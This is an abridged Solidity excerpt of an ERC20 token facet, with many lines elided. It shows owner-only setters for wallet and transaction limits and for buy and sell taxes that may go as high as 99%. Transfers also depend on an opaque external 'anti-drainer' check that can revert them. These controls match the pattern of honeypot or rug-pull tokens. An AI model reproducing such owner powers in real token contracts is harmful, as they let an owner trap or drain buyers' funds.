...
contract activateTradingFacet is ERC20, Ownable {
    ...
    function excludeFrommaximumTknsPerTxn(
        address addr,
        bool value
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.bExcludedmaximumTknsPerTxn[addr] = value;
    }
    ...
    function updateMinimumSwapTokenAmount(uint256 amount) external onlyOwner {
        ...
        ds.tokenTaxSwapThreshold = amount;
    }
    function updateMaxTokensPerWallet(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 5) / 1000) / (10 ** decimals()),
            "Cannot set ds.maximumTknsPerWallet lower than 0.5%"
        );
        ds.maximumTknsPerWallet = newNum * (10 ** decimals());
    }
    function updatemaximumTknsPerTxn(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 1) / 1000) / (10 ** decimals()),
            "Cannot set ds.maximumTknsPerTxn lower than 0.1%"
        );
        ds.maximumTknsPerTxn = newNum * (10 ** decimals());
    }
    ...
    function updateBuyTax(
        ...
        require(ds.buyTotalTax <= 99, "Must keep tax at 99% or less");
    }
    function updateSellTax(
        ...
        require(ds.sellTotalTax <= 99, "Must keep tax at 99% or less");
    }
    ...
    function _transfer(
        ...
        if (ds.limitsInEffect) {
            if (
                ...
                if (
                    ...
                    !ds.bExcludedmaximumTknsPerTxn[to]
                ) {
                    require(
                        amount <= ds.maximumTknsPerTxn,
                        "Buy transfer amount exceeds the ds.maximumTknsPerTxn."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maximumTknsPerWallet,
                        "Max wallet exceeded"
                    );
                } else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds.bExcludedmaximumTknsPerTxn[from]
                ) {
                    require(
                        amount <= ds.maximumTknsPerTxn,
                        "Sell transfer amount exceeds the ds.maximumTknsPerTxn."
                    );
                } else if (!ds.bExcludedmaximumTknsPerTxn[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maximumTknsPerWallet,
                        "Max wallet exceeded"
                    );
        ...
        if (
            ...
            bool check = IAntiDrainer(ds.antiDrainer).check(
                ...
                to,
                address(ds.swapPair),
                ds.maximumTknsPerWallet,
                ds.maximumTknsPerTxn,
                ds.tokenTaxSwapThreshold
            );
            require(check, "Anti Drainer Enabled");
        }

        uint256 tokenBalance = balanceOf(address(this));
        bool canSwap = tokenBalance >= ds.tokenTaxSwapThreshold;
        if (
            ds.bSwapEnabled &&
            canSwap &&
            !ds.bSwapping &&
    ...
    function swapBack() private {
        ...
        if (tokenBalance > ds.tokenTaxSwapThreshold * 20)
            tokenBalance = ds.tokenTaxSwapThreshold * 20;
        ...
        (success, ) = address(ds.marketingFundsWallet).call{
